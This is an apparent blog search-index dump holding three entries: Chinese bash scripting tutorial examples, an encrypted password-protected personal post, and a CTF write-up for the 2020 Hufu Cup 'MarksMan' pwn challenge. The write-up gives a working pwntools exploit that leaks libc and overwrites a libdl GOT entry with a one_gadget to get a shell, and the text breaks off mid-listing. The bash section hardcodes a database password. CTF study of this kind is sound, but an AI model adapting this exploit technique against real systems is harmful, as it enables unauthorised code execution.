$6echo &quot;use shift to move var&quot;shiftecho $1 $2 $3 $4 $5echo &quot;move 2&quot;shift 2echo $1 $2 $3# $#表示上一个命令的参数个数,不包含shell脚本本身echo -e &quot;\\n\\$# 参数个数&quot;echo $## $?:表示上一条命令执行后的返回值(也称为“返回码”“退出状态”“退出码”#等),它是一个十进制数。多数 shell 命令执行成功时,返回值为 0;若执行失败,则返回#非 0 值。shell 本身返回$?的当前值作为 shell 命令的退出状态echo -e &quot;\\n\\$? 上一条命令的返回值&quot;echo $?# $$:表示当前进程的进程号. 每个进程都有唯一的进程号(即 PID)echo -e &quot;\\n\\$$ 进程号&quot;echo $$# $!:表示上一个后台命令对应的进程号,是一个由 1~5 位数字构成的数字串echo -e &quot;\\n\\$! 上一个命令的进程号(退出就没有了)&quot;echo $!# $-:是由当前 shell 设置的执行标志名组成的字符串. 例如,“set -xv”命令行给#shell 设置标志-x 和-v(用于跟踪输出)echo -e &quot;\\n\\$- 标志名组成的字符串&quot;echo $-# $*:表示在命令行中实际给出的所有实参字符串,并不仅限于 9 个实参echo -e &quot;\\n\\$* 实参字符串&quot;echo $* # $@: 与$*的功能基本相同,表示在命令行中给出的所有实参,但&quot;$@&quot;与&quot;$*&quot;不同echo -e &quot;\\n\\$@ 实参字符串&quot;echo $@ # 证实 $* 与$2不同echo -e &quot;\\n证实 \\$* 与\\$2不同&quot;dateset `date`echo -e &quot;\\n\\$* print&quot;echo $*for i in &quot;$*&quot;\tdo\t\techo $i;\tdoneecho -e &quot;\\n\\$@ print&quot;echo $@for i in &quot;$@&quot;\tdo\t\techo $i;\tdoneecho &quot;end&quot;\n\n打印参数#!/bin/bash# for i in &quot;$*&quot;#\tdo#\t\techo &quot;The parameters is:$i&quot;#\tdone x=1 for y in &quot;$@&quot;\tdo\t\techo &quot;The parameter$x is:$y&quot;\t\tx=$(($x+1))\tdone\n\n\n\nif else#! /bin/bashecho &quot;Input two numbers&quot;read x y((z=x+y))if [[ z -gt 10 ]] # gt:大于 lt:小于then\techo &quot;x+y&gt;10&quot;else\techo &quot;x+y&lt;=10&quot;fi((x*=y))((x%=5))if [[ x -le 100 || z -ne 0 ]] # orthen\techo &quot;x*y&lt;100 or (x+y)%5!=0&quot;fiecho &quot;Your current directory is `pwd`&quot;echo &quot;Input a filename -&gt;&quot;read namefilename=$&#123;name:=./&#125;if [[ -r $filename &amp;&amp; -f $filename ]]   # 是文件就查看当前文件then\tcat $filenameelif [[ -d $filename &amp;&amp; -x $filename ]] # 是目录就查看当前目录的文件个数then\tcd $filename\tls -l | wc -lelse # 文件不存在\techo &quot;bad file name&quot;fi\n\n\n\n数组#!/bin/bash# 使用冒泡排序算法将数组[52, 39, 68, 94, 75, 6, 31, 43]进行升序排序#定义数组array=(52 39 68 94 75 6 31 43)# 获取长度len=$&#123;#array[@]&#125;echo $len\n\n排序\n#! /bin/bash# 实现功能为冒泡排序arr=(52 39 68 94 75 6 31 43)len=$&#123;#arr[@]&#125;for (( i=0; i&lt;$[$len - 1]; i=i+1)); do\tfor (( j=0; j&lt;$[$len - $i - 1]; j=j+1)); do\t\tif [ $&#123;arr[$j]&#125; -gt $&#123;arr[$[$j+1]]&#125; ]; then\t\t\ttemp=$&#123;arr[$j]&#125;\t\t\tarr[$j]=$&#123;arr[$[$j+1]]&#125;\t\t\tarr[$[$j+1]]=$temp\t\tfi\t\tdonedone# 打印排序后的arrfor i in &quot;$&#123;arr[@]&#125;&quot;; do\techo -n &quot;$i &quot;done\n\ncase#! /bin/bashcase &quot;$1&quot; in\t1)\tmonth=January;;\t2)\tmonth=February;;\t3)\tmonth=March;;\t4)\tmonth=April;;\t5)\tmonth=May;;\t6)\tmonth=June;;\t7)\tmonth=July;;\t8)\tmonth=Aguest;;\t9)\tmonth=September;;\t10)\tmonth=October;;\t11)\tmonth=November;;\t12)\tmonth=December;;\t*)\tmonth=error;;esacecho &quot;Month is $month&quot;\n\nfor#!/bin/bash# seq 是制定数的范围进行打印for i in `seq 1 100`;do\techo -e &quot;\\033[32m$i\\033[0m&quot;done\n\nexpr 求和运算#! /bin/bash# expr 求和运算# 采用 sh -x for2.sh 可以看执行过程sum=0for ((i=1; i &lt;=100; i++))do\tsum=`expr $i +  $sum`done\techo &quot;1 + ... + 100 = $sum&quot;\n\n文件打包#! /bin/bash# 实现以当前.sh 文件打包for i in `find . -name &quot;*.sh&quot;`do\t#echo $i\ttar -czf $i.tgz $idoneif (($1 == 0));then\tfor j in `find . -name &quot;*.tgz&quot;`;do\t\trm $j\t\tdonefi\n\n计算小于100的所有正偶数的和#! /bin/bash# 计算小于100的所有正偶数的和sum=0for ((i=2; i&lt;100; i=i+1)); do\tif [ $((i%2)) -eq 0 ]; then\t\tsum=$((sum + i))\tfidoneecho &quot;sum: $sum&quot;\n\n打印1~150之间的素数#! /bin/bash# 打印1~150之间的素数asdf=334for (( i=2; i&lt;=150; i=i+1 )); do\tis_found=true\tfor ((j=2; j&lt;i; j=j+1 )); do\t\tif [ $((i%j)) -eq 0 ]; then\t\t\tis_found=false;\t\t\tbreak\t\tfi\tdone\tif $is_found; then\t\techo $i\tfidone\n\n\n\nselect#! /bin/bashwhile truedoselect menuItem in Show List File Exitdo\tcase &quot;$menuItem&quot; in\t\tShow)\t\t\tdate\t\t\tpwd\t\t\tbreak;;\t\tList)\t\t\twho\t\t\tbreak;;\t\tFile)\t\t\tls -al;;\t\tExit)\t\t\texit;;\t\t*)\t\t\t;;\tesacdonedone\t\t\t\n\n\n\n实例mysql备份#!/bin/bash# Auto backup mysql database# define backup pathBACK_DIR=./mysql/backup/`date +%Y%m%d`MYSQL_DB=ltalkMYSQL_USER=ltalkMYSQL_PASSWD=123456MYSQL_CMD=/usr/bin/mysqldumpif [ $UID -ne 0 ]; then\techo &quot;Must be root exec shell script&quot;\texitfiif [ ! -d $BACK_DIR ];then\tmkdir -p $BACK_DIRelse\techo &quot;This &#123; $BACK_DIR &#125; is existed!&quot;fi# Mysql backup$MYSQL_CMD -u$MYSQL_USER -p$MYSQL_PASSWD -d $MYSQL_DB &gt; $BACK_DIR/$MYSQL_DB.db# Print result infoif [ $? -eq 0 ];then\techo -e &quot;\\033[32mThe mysql backup [$MYSQL_DB Successfully!\\033[0m&quot;else\techo -e &quot;\\033[32mThe mysql backup [$MYSQL_DB Failed!\\033[0m&quot;fi\n\ntreesize#! /bin/bash# 以文件大小进行升序排序du -sb * | sort -n\n\n","categories":["language"],"tags":["bash"]},{"title":"大学计划","url":"/2020/06/18/life/school/%E5%A4%A7%E5%AD%A6%E8%AE%A1%E5%88%92/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977587d39b41b6ebc7783b6023348213d014392e736939c9285ada2d973d7e1e69c3d47d1045065e5c55dfa0f94be4d75531b46f0511d9836d31b8fde317785bce200c9881d63471c365836de3788f7bc0dc3ea4508d931a558aedc29d22bb70b787ad9a0e525cc07ee73e9c77ba96c8fb661327dc24d3544d1295e071f5dcf7bc4011e9addff067cb660acc4f3fd815d860022d357e906a856aeaeb1d9bd85741c76dfdd0309484c439f09a2f7629d7da00d980d689d1bbdc97ef35d1296092bc629ae61eb073df200915b5064fc7f220be4b345ea29d6c211aa2bab313cebf104f5e9d202460df9a2da94b96997743031eef28893d63db9fb85d317942c0e424995f48ce78355fa95600c332b5999b05c6be7e5ef2030078137924a38ca59e5860cfdb31661329cc75eb6f9293f0dd9285a91cfee903905d71549dc12c37e969b04d201604aaeb279b2f32123c6ec2f52752223e1b7a6850b2adcb87494cfab40ee69f154702ecd21996f0726b456343189f107668aea39a4adbb87fce8cd3a219edeb676b438b0e76606aaa20984ef6cfa183efde73aec86292a8414f6a755be7581f129d8bce424217e77b4e9a05cb575c4e04254aeb4576ff3f9203d689ec849ba2882b9429f9cac629cd3565ae4c679e07d8cbba5662b3277ccbc06a7f0b6ab1536529f1089a96cf4bbd5fc9fb88956aae528aa04a046d390323aea09bbe8b5be37a366981d9036cdc6036eafcfa5a9f5fa08bf7dbf9b5b64bb5f60b630f43075023c08b0aa2152dc9d5b4fb02bf985fd956e7b11bcb417feb5a792ab5d6db89abdf6d8aeff1f78615aef55d6157e26777ee8ba5cf65bc725ab3c68e0dce0a7d96401a57bd2ea666b897f6150061367e610f42e3fcd219c66fa94782c5202437019f574202c5199be2a6552c4513931e3b6025b3157003a693441aa8bd84edee31585e2d9c23cab420254a62eb11904fc7a79100911c1b377fa308fb41fbf8d2f30c838a39d15e9938cc0f0835b5658f6c9be1e13fbc967643f4fa0a2413954221b84240887cdd969c85dfccc97e7b83512f1570157a2475903a871265c17e001e408ea85ff38a6bc3379a461cd5a4871c7fd20a3b704419eba25570bdf94b0f5a58611d4273d8d0ba3b87bbff5576576a18e4c5230f42faa0330114532c9932e10a23afadaa9324f278b48fb3e3f589b2431fa6d9fe3d916efd93f9a4f67e28d43a426c711cb5af332e8f67ba6ea7aecffe0882e2088556910dd0ce3a3f22b1f191d2aaa0d8f9081d188c7c950620bcd0eb6c6529be1ef7732bacab3bbee579b8f5c21e0a7664565b9347c2985890208f4845a276cb51d067d437fb83a4a74cca2335ffdb80fa2ced0e64fce786ec1ee89d2aeea1a74a7c87737b6d4b83b420f00fa3bd81cb93f32e559e589b3aa2a5277d8c5b66f5b94c8b229a94668e894527838d0001ad27f952db5f78d5973389d34835144cf5a9e16b35c7827ee437789451c602d61387650ecc04787a9e8352248618d4bf41e8218e9ba6d6921ac0e9cb445ea788f6797523c19e33bb9b7ae9071080e48dd9c0f6e59970f8edb9b214914ab63f823b83d29c0b50e7879a6f0e9f01b6a2262d5d139b6482a73d70bf1c636ad7bb0ecf6152e152d4929993854f4fcca8adc536071eb5bf7a1275c5f61193154270d2b72f7cf79e01ba946510380191056253a3be98628b170efcdc7ce96c339c1454387b245fcae7e308d1f115778a6f04f5dbcf2f96672f04c88fc61351012ea30cf1f9cb58e3a71aaccb8f5463b96ec11777f4311107300a0324aa0e3b65dc292ecc8cb3bc2be1a08165a4748aaf420617cbe270eeba21c28865ccd4412928d566a587d799f3b243ae1b1c850a9b24729f3ccaaa50feaf1424e6aa4f4ad36c838cb1fd5c4f7b28847038d907582b32c98d8dd19bda1741bbccfeacf653efb98c722fffcf464657412340693083b1ef66101ad6430351b7f99aa6479e03a32eef1d568392f67383abaa73436ece811f847f769ca0bf8545e6d5363c95e9d1770f0adf16ac2f5cf4c7abb08aad56a84aa68c66510fd5e57c02e84f0408a52b6d5c702a69d06fd59124a3b15983c20ec49174c9b8b5a22319c7e2c9bfd4ff1c0607380077e43fed5374128f6e53db71d180447c63838309852dd0eff08d0c1904e3fd76dfa6a605df058a3b877c0021ecf33c27374d881e34a9736d353080795fdc2d2172ee7567fa78b6660cdbcca48b05e9862de1ff7621f50a77da52baca92b36b7e571becf6e4a741f783def4240f3ad397304a1aa6adfc989d686f0973431171d33ead6c0a76d1057a0ea4edc75095d6740ce746d15f75fa41b2f3301e363b2350e73e5f260bb0e6f1f0e5e89fa19f1cc478fa67b56cfa3f38b59c2e2b2c3b8d02180247d8b6df512bbec2e6fa46c1d140418da5fa5bd7a9f8e906a5eb9531d73e9f79d0bf5a68c93fcf57d651e56900c8af0ca1df3a3367d9a070222876d167b134283d2bf7d3e87e31718f2d1770dad9565042ebb7c837d4eab4392ecbf933205a205f87bce7511b1df4fed6a8acf8d0c2b52aac4e8f94dda29bd381cc550141448a560b7a2588e5d89b9e5c140831999c7af779e4bede91f23b6c75236dc672fbad3804bd2a3943b9aeb8c97c30fcc5178cc15a0d85ef1393750eb23e80e0337a8ab84b801e7a138255de1506b8c03b84550ad5fbdac11c333d86c414f2d62b14d07628088e41a37c5280dd1dbddfe6a3736ea45ab95041b5e76db4ffcdee8e09e55e57d5c0dc5dcb8d8ef8654311a16dddbbb6e49c895d39ee931bae018cdb2261eb5c0c77c36aed86bfd863767dba08e2cb0f5f2cdfbc1e8f1ae6e99c29d54b68e98219e3fba860def9f2f6506ac6c088ae2596eb0db9f78d6211ed6a7357fc65f925ddac3435013b64c13b47c8459ad357c453bbb433315774d08a54558813154319a67830e7efe88390f664ef4989dca8721e506d21b19f89336427863ea858da213f71c54c9810a0e1966f350f01a4ee8eaff44e59c0e387f71f1e44ae18bfd5b14abe5e7653b19c10d3779997117d97c95d67749eab8774d4428ace6756694b3a02e63fda253841fb6651f949dd60710865875c496bc9c7ab3eaec457b53ccac68a0ba6c28ab8fefd06bdbd7348dfcaaeb4227e5d0edcf9329bb418a5ba7f57da74ab216cc65a30d81e86740f8a3a166e67e977f8bb008ecb69282472f8b944c245ce6dd4086b133807506657ead630802b9d02018980a96b4cf1d3611639f657c843bb6b811da63f272b8910c43b04020f55ededae7cdf9471335dcecf3db69157f8c60017a7a1d5d5ca8e86619a7694138f2ae7777f4c66454a489ede84dcec9f3c612e0dd4430ac688085329d043d2f65b58a9a3abb589f07ea1b558c125a89ac2c01b0135377014a7bdaa86403ab868e277fb2f1a330c5909840856ec9b997e55dd6e0d187d5fcf45d29118175d9952c4fafbbff111f2726533e29fe00777ea12e96f8819ea72f271f2f5d8cba51da5dc0d9bbb1a07eeadd95c6911fe0c3825bd8304fcb835b9843bda53cfbc867be00fb505741f5d4739f9ca417ba2111d17e6146492ed58b2cc39a0525bd5530bce9816fe0ce588be7481c6112a34bd88f8bdbfb50181f39592b5348b8ae61bb26560632add8ea65685c8df1a5e7068f28a2dfc016a1e07205e52f45ccb074bdb07fac623f8f2a12351759e91a885b2d79bb331726ab1062f578cf0bcf17ef5868ec57964202cd802df635b62d2870173dfe6cb537889276961f3b103ae5dc02df7bd4cbd4af970de7539dc0bc6f9bdce823337d04662b18da96af439f9190fab24211143dc8259eb5acce23b2cdcde97b949b242dcd00364940a6254cd4a810356ee33e51f99bf4e5ba5b2c7b2bd15d55b3ca7e56ea5731dabb3d6467645460c44a40fd1aa531bebd3bd60b9242db987dbf8f1a4a337f51ed0e679a365798f08ba98b6ef97297fc4d3a95b739738a5c8e245f0b0cfbf1de8891ee6675bf7348142c95c4ff4b3eeace297cf0c142e9e54bf19ca7df9adf6c1bd8df65022b12b6c4a5d0a48d9e6fa0e7075b8fa4f5310743904ce3cfa1ae1f91e082e16bb628ef376934ac6912b7f4364bf47869c859ba44241805e1a3ce7a170075d9fdb35ff851ca0c02627d26dcd75d024a631c1c6ee385d8ab292c409130fd2ef01e251e2b3716deff113a4cba2425da2e9785e51b4ce5935a715beaa51ccd05122902b0ee128f286693b24f3a812f225f4f8ec51c479ae62469bb210d09e10b3ea17fb7f9fbb6194f92eb7813cf71e82f99688948ad76afd45d10324b58783e18f6b2b08b7ff4c859cae17114d4ad1f899b4fc6a922c56106c82b543ff1920e1d3edd6e301a8c37ec5f79333b6b6aed8cf1a6154501bc0c1f73d92162cd5dafa4da3b55a1e38fc3495165e7316ddba1f444d2b0362ddc285dcaaef2cb5745f1103da9e1bf2a9240ef3147dbe41df8f6b839001ad1c28d81ce44e4adcf27bb810956cbc6d72ff6d6b52b9ec0e9999a8c32233226996f78b586b80328ffb32ca98d4b8a99f1305155d192b48f2cfd2a50f0356a90d61b7ea4920f999bbaf2f2c9c4a332c69de67b5458ac3b015a27e2eb0f7ffe3b10bc852911721d07738a39cb891971e28d5e7e30ce8d5a7f3973368fd878a58033f42d9e39883a11bb3c42f34cca3217e25bb667bce12e2390879c1b702d265c4855196ca50e916094907571e1be3e14abacf95cc55c4cbc02ae57f301d53cfa705c0b2cc5c5fe475ca0efeacdd6e6393a5ee111fcf0d2895e0bfefe8918e796a778ff408c6fe4c558ae8ef4b6e183e5fc6f0d497a81a5484c82dc439e093b7fa7fa45f66b6b3e84df0e62775798f69ea1ca8bb977e0c9e8b023c1458072971aa88ff8cb7a0b8a981aa2912a23a79c38cc603c4e25673d695f6fc87361db96f5374f1a6a68524b6d6a5c893b313dd76f6feb466ba02bf2c896830211d7302b8863cafe9e7bfb7a69bfceeaba9c0a3a652c4aa251b22aaea90d1c2f71edac5d4691d4d8e22affa3566bf8bd146807860cd84ea88f1290acca21ab85fcc54d9b78afeb269406ccf2caaf739c37a45b8a0809ec0dd051b9870c14abdcbc6aaaa536badee51fe47e82af52aecfc986c18521bc237a7da862f75af5bb97dea2e7543451d865de45a0a164e0ac75723dafa9938052c26b0b3ea1ff9768ff9e696e3ce6f972e770c9c54d732e194283a2e6c39f81b52311bdb51e347695e15af03cee9bec99a7479da85caf935d11749ee560a58ee39573e0a39f66b661ba322fa2e18cb48090e44d295120ac9fd22ccc1da5e0ff2db78d683aa49b965fa145c4de4247192a18c4e69112b93470898e84ef9b4cf75dd124eac8aa700f4eb4e33d353b28e20db9ec5622618e8d30970b852d8f38982e4b89e57c6a0f677d1b04418fbc495d148aa89820be0441cd0d1254260f34a94f8b8ef1df90e019511cd892fe1711f80b3010a1bc02fcd3fce41b2d92dfb42b8c02127ba727e7e3f18867061fe05fce08b7441bdcaa55520dc817768e7130d2d57b7f5101c883147c54283142191075d183ee448f31c93565ecd24b9c3eeda1e96ff6bb09b423e53103895e8742fb333e35c62ef26600591d985a1cd3877bf5a3efea6ae95bec9e79555bd8a0139f849ef2e1030cedca6c4c8a2132fad8906c83bf818643e2992fd4689998e55592a5d6c0a5d3307449eb5c0f7a031597133e5e7851a6ea69e34926b8408130d2e1a4d54baaea7b3c867ce58c5bf2d4c63646be2f31b0d0c5b6bef6aff0b5a3bb8357cf5240170f64cde10534e862c813ec7e95e62abfecf1f225ef5dc512767c6f5bba3cfd551517533790e8a24609ca941665cddbb59e705a49e6c63830d6aace89188cd1c208c1d8dfd75968cc9365bf42146a61e887f3401927a50651663f371fb1153217fd39d19cbd7b61997c2c9705bcc1c80334eedce6f089e00f8044d1c207710e39e050052e71562ca16543ba59aafe7cae1fb000ed570c04976a8b4f369de1d79b731dfb576a8ee4050448b3f7afdcf0f9801f3864817246f56a1be74e30669e9d947558a5831c275c61e94a801b235db58e245aaf0c167e2445c262ecc8b6874fe3dec27beba726359f4fe31ca8d21ad189826ec34ddf5b09af579cfc4fe2588058e6b35873e8b8940be949613e7e685f83600dda150ef8fd48cf2e79c8666a0a6e4a9081ddd6d742b1cca25bdc1784b2fbdacbffa648b165a1f35a3cc7d4faf3d74f1e140523658537f762246058e504e9e2b70f1ee673a1f87133d7b7fc6b367ba02ef5737c98ddb11ffdcc1769a71f37d12fb566d77eadb69c5fe76d8bb5d832cb61cf6963acd64242953e867d7e3706e0f7eaf6e82aeb4a273c78ba06d9353cf6fcf9895c86757c2ca3cf70cf42d5eca663130553621fb81fd2b4a5c7094c8d1a71835498889c6891eec9ecfcac2229126177b098e8f887fb7442296ae187a305430deee0b98bdc60a4a025cac35a7f87bb980fd326a11c7d6547f45b5b021952f6288213c23dca2471914dd6cfd37681db1bab48f5a375642bfc38480cb87f8002ab245ac2b84372835ea79d0823f5f78287190d7b9581b5e176bbcb009de3996a5469971d43281964ac72bc07165be8e83cff89c1004ac74b4fcaa97c660eacc9c8155c13cdf62bef2aad134ea69da95c664eaec28e07ff2760f92e5eb0a0ddd0b6c5afa4433038b59d1e589601788b23c97de034589ecaaba68a213acb240ebde006f464bc4bb5253f6a63c6baada47b9508411302afc585f1dd8e6495a72f5df3fe8d11592b5d49eabea1bd7b262820bfcc7db9eb57af70e6655d88ced220e48f18bf6d61059f4651a867a0c2ae9626ceb575f5da0a138a2da719f949705103d944d999f6b1537a8ae70abb0036ee7f6cef8f8c87f4c26d441266f2e2b4e38d19c476b8886654e4a22e592e7e55ac745527d3df13b3803db692596c291a94a4ddea39d7b4ae07dd9b70494c1ab55cc12f68c3e1f29d761df4ba27aa54bfe3393b64523d74fcba0238023451aec3ddce64f8d655add583ea3d44edca1676f4e97f3b982343830951e72b2f25cb248e079f6f999bb76de226fe7894775a3e716f9be7e5950a1a72ab3802af15cf99\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"2020虎符杯Pwn WP","url":"/2020/06/18/security/ctf/compitation/wp-hfb-2020/","content":"虎符杯-2020-pwnMarksManWorld of Attack &amp; Defense\n难度2 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述输入一个地址,然后再输入3字节的内容,这三个字节的就写入该地址,开启三个字节的检查机制,防止one_gadget,但是某些one_gadget可以绕过.\nvulsub_9BA(); sub_A55(); puts(&quot;Free shooting games! Three bullets available!&quot;); printf(&quot;I placed the target near: %p\\n&quot;, &amp;puts); //泄漏libc puts(&quot;shoot!shoot!&quot;); v6 = sub_B78(); for ( i = 0; i &lt;= 2; ++i ) &#123;   puts(&quot;biang!&quot;);   read(0, &amp;v7[i], 1uLL);   getchar(); &#125; if ( (unsigned int)sub_BC2(v7) ) &#123;   for ( j = 0; j &lt;= 2; ++j )     *(_BYTE *)(j + v6) = v7[j]; //覆盖3个字节 &#125; if ( !dlopen(0LL, 1) )   exit(1); puts(&quot;bye~&quot;); return 0LL;\n\n\n\n知识点one_gadgt,  libdl.so.2链接\n思路同找到libc某个函数的plt,然好找到libdl.so.2中的链接地址, 将该地址修改为one_gadget获得shell\n利用找目标地址► 0x7f340b44f730 &lt;_dlerror_run+96&gt;     call   _dl_catch_error@plt &lt;0x7f340b44ed90&gt;     rdi: 0x7f340b6510f0 (last_result+16) ◂— 0x0     rsi: 0x7f340b6510f8 (last_result+24) ◂— 0x0     rdx: 0x7f340b6510e8 (last_result+8) ◂— 0x0     rcx: 0x7f340b44ef40 (dlopen_doit) ◂— push   rbx\n\n反编译\npwndbg&gt; disass 0x7f340b44ed90Dump of assembler code for function _dl_catch_error@plt:   0x00007f340b44ed90 &lt;+0&gt;:\tjmp    QWORD PTR [rip+0x2022a2]        # 0x7f340b651038   0x00007f340b44ed96 &lt;+6&gt;:\tpush   0x4   0x00007f340b44ed9b &lt;+11&gt;:\tjmp    0x7f340b44ed40End of assembler dump.\n\n进入该地址,该地址里面是libdl.so.2链接器中储存libc.so.6中函数的地址\npwndbg&gt; x /40gx 0x7f340b6510380x7f340b651038:\t0x00007f340b73769f\t0x00007f340b44eda60x7f340b651048:\t0x00007f340b44edb6\t0x00007f340b44edc60x7f340b651058:\t0x00007f340b44edd6\t0x00007f340b44ede60x7f340b651068:\t0x00007f340b44edf6\t0x00007f340b44ee060x7f340b651078:\t0x00007f340b44ee16\t0x00007f340b651080\n\n在继续进入该地址, 可以发现,进入到了libc.so.6地址中\npwndbg&gt; x /40gx 0x00007f340b73769f0x7f340b73769f &lt;execvpe+527&gt;:\t0x4c000ce7f43d8d48\t0xf77fe8f6894ce2890x7f340b7376af &lt;execvpe+543&gt;:\t0xfe35e9ec894cffff\t0x0ce7da058d48ffff0x7f340b7376bf &lt;execvpe+559&gt;:\t0xe58949b0758d4c00\t0xb0458948b87d894c0x7f340b7376cf &lt;execvpe+575&gt;:\t0x0000001046c74990\t0x00441f0f66c5eb000x7f340b7376df &lt;execvpe+591&gt;:\t0xee894ca87d8b4800\t0x4dd231fff3bb44e8\n\n所以我们只需修改libdl.so.2链接器中的储存的地址就行,类似于修改got表,但怎么获取该地址, 由于libdl.so.2紧挨着,直接可以计算该地址.\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x55d6904bc000     0x55d6904be000 r-xp     2000 0      /home/logan/share/pwn1/chall    0x55d6906bd000     0x55d6906be000 r--p     1000 1000   /home/logan/share/pwn1/chall    0x55d6906be000     0x55d6906bf000 rw-p     1000 2000   /home/logan/share/pwn1/chall    0x7f340b44e000     0x7f340b451000 r-xp     3000 0      /lib/x86_64-linux-gnu/libdl-2.27.so    0x7f340b451000     0x7f340b650000 ---p   1ff000 3000   /lib/x86_64-linux-gnu/libdl-2.27.so    0x7f340b650000     0x7f340b651000 r--p     1000 2000   /lib/x86_64-linux-gnu/libdl-2.27.so    0x7f340b651000     0x7f340b652000 rw-p     1000 3000   /lib/x86_64-linux-gnu/libdl-2.27.so    0x7f340b652000     0x7f340b839000 r-xp   1e7000 0      /home/logan/share/pwn1/libc.so.6    0x7f340b839000     0x7f340ba39000 ---p   200000 1e7000 /home/logan/share/pwn1/libc.so.6    0x7f340ba39000     0x7f340ba3d000 r--p     4000 1e7000 /home/logan/share/pwn1/libc.so.6    0x7f340ba3d000     0x7f340ba3f000 rw-p     2000 1eb000 /home/logan/share/pwn1/libc.so.6\n\n计算该地址ru(&#x27;near: &#x27;)lib.address = int(r(14), 16) - lib.sym[&#x27;puts&#x27;]li(&#x27;libc_base: &#x27; + hex(lib.address))_dl_catch_error_got = lib.address + (0x7f15af376038 - 0x7f15af377000)\n\n\n\n修改该地址为one_gadget由于体中开启了金手指\nsigned __int64 __fastcall sub_BC2(_BYTE *a1)&#123;  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )    return 1LL;  puts(&quot;You always want a Gold Finger!&quot;);  return 0LL;&#125;\n\n默认的one_gadget就不能使用了,就需要更多的one_gadget\nlogan@LYXF:~/share/pwn1$ one_gadget libc.so.6 -l 120x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0xe569f execve(&quot;/bin/sh&quot;, r14, r12)constraints:  [r14] == NULL || r14 == NULL  [r12] == NULL || r12 == NULL0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])constraints:  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])constraints:  [r10] == NULL || r10 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)constraints:  [r10] == NULL || r10 == NULL  [rdx] == NULL || rdx == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])constraints:  [rsi] == NULL || rsi == NULL  [[rax]] == NULL || [rax] == NULL\n\n采用0xe569f execve(“&#x2F;bin&#x2F;sh”, r14, r12)能打通.\nli(&#x27;_dl_catch_error_got &#x27; + hex(_dl_catch_error_got))# modfy dl_catch_error_gotp = str(_dl_catch_error_got)sl(p)# set as onegadgetone_gadget = lib.address + 0xe569fp = p64((one_gadget) &amp; 0xFFFFFF)li(&#x27;one_gadget &#x27; + hex(one_gadget))li(&#x27;p &#x27; + p)ru(&#x27;biang!&#x27;)sl(p[0])ru(&#x27;biang!&#x27;)sl(p[1])ru(&#x27;biang!&#x27;)#db()sl(p[2])\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;chall&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;libFile = &#x27;./libc.so.6&#x27;remoteIp = &quot;39.97.210.182&quot;remotePort = 10055LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------#--------------------------Exploit--------------------------def exploit():\tru(&#x27;near: &#x27;)\tlib.address = int(r(14), 16) - lib.sym[&#x27;puts&#x27;]\tli(&#x27;libc_base: &#x27; + hex(lib.address))\t_dl_catch_error_got = lib.address + (0x7f15af376038 - 0x7f15af377000)\tli(&#x27;_dl_catch_error_got &#x27; + hex(_dl_catch_error_got))\t# modfy dl_catch_error_got\tp = str(_dl_catch_error_got)\tsl(p)\t# set as onegadget\tone_gadget = lib.address + 0xe569f\tp = p64((one_gadget) &amp; 0xFFFFFF)\tli(&#x27;one_gadget &#x27; + hex(one_gadget))\tli(&#x27;p &#x27; + p)\tru(&#x27;biang!&#x27;)\tsl(p[0])\tru(&#x27;biang!&#x27;)\tsl(p[1])\tru(&#x27;biang!&#x27;)\t#db()\tsl(p[2])def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()&#x27;&#x27;&#x27;logan@LYXF:~/share/pwn1$ one_gadget libc.so.6 -l 120x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0xe569f 